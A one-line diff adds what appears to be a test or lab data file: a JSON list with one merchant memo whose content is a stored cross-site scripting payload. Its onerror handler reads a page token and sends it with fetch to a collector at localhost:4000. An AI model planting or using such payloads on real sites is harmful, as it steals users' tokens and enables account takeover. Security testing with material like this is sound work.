@@ -1,0 +1,1 @@
+{"memos":[{"id":"57d572c5-7161-4d9a-9123-ac5da1e50ad9","merchant_id":"acme","content":"<img src=x onerror=\"fetch('http://localhost:4000/xss?t='+encodeURIComponent(document.getElementById('token').value))\">","created_at":"2026-10-30T16:44:52.605Z"}]}
